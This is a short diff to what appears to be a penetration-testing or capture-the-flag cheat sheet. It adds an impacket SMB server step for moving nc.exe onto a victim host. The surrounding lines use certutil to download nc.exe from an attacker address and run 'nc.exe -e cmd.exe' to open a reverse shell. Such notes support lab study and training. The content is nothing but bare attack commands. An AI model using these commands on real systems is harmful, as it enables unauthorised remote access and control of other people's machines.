@@ -175,6 +175,10 @@ Password Protected SSH Private Key:
 			- certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
 			- C:\temp\nc.exe -e cmd.exe 10.10.XX.XX 1234
 			
+	- impacket
+		- Start SMB server: impacket-smbserver smb Downloads/ 
+		- On victim: copy \\10.10.16.12\smb\nc.exe
+			
 
 
 
